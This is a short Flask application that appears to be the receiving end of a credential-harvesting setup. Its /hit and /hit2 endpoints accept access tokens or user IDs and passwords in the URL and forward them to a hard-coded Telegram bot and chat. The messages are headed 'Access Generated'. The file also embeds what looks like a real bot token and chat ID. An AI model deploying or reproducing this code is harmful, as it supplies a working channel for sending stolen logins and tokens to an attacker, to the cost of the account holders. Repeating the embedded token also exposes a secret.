from flask import Flask, request, jsonify
from datetime import datetime
import html
import requests

app = Flask(__name__)

# ⬇️⬇️⬇️ YAHAN APNA DAAL ⬇️⬇️⬇️
BOT_TOKEN = "8821268348:AAEDCkxOmNkG474Ih7TYtkQRw6pVGDB0Lo8"
CHAT_ID   = "8488332629"
# ⬆️⬆️⬆️ BAS YAHI 2 LINE CHANGE KARNI HAI ⬆️⬆️⬆️


def send_to_telegram(text: str):
    """Telegram ko message bhejta hai, response return karta hai."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        r = requests.post(
            url,
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        return r.json()
    except requests.exceptions.Timeout:
        return {"ok": False, "description": "Telegram timeout"}
    except Exception as e:
        return {"ok": False, "description": str(e)}


@app.route("/")
def root():
    return jsonify({
        "status": "online",
        "service": "Telegram Forward API",
        "endpoints": [
            "/hit?token=<token>",
            "/hit2?uid=<uid>&password=<password>",
        ],
    })


# ============ ENDPOINT 1: token ============
@app.route("/hit")
def hit():
    token = request.args.get("token")
    if not token:
        return jsonify({"ok": False, "error": "token required"}), 400

    safe_token = html.escape(token)
    text = (
        "🔓 <b>New EAT → Access Generated!</b>\n"
        f"🔑 <b>Access Token:</b> <code>{safe_token}</code>"
    )

    data = send_to_telegram(text)
    if not data.get("ok"):
        return jsonify({
            "ok": False,
            "error": data.get("description", "Telegram error"),
        }), 500

    return jsonify({
        "ok": True,
        "sent": token,
        "message_id": data["result"]["message_id"],
    })


# ============ ENDPOINT 2: uid + password ============
@app.route("/hit2")
def hit2():
    uid = request.args.get("uid")
    password = request.args.get("password")

    if not uid or not password:
        return jsonify({"ok": False, "error": "uid and password required"}), 400

    safe_uid = html.escape(uid)
    safe_password = html.escape(password)

    text = (
        "🔓 <b>New EAT → Access Generated!</b>\n"
        f"🔑 <b>Uid:</b> <code>{safe_uid}</code>\n"
        f"📍 <b>Password:</b> <code>{safe_password}</code>"
    )

    data = send_to_telegram(text)
    if not data.get("ok"):
        return jsonify({
            "ok": False,
            "error": data.get("description", "Telegram error"),
        }), 500

    return jsonify({
        "ok": True,
        "uid": uid,
        "message_id": data["result"]["message_id"],
    })


@app.route("/health")
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)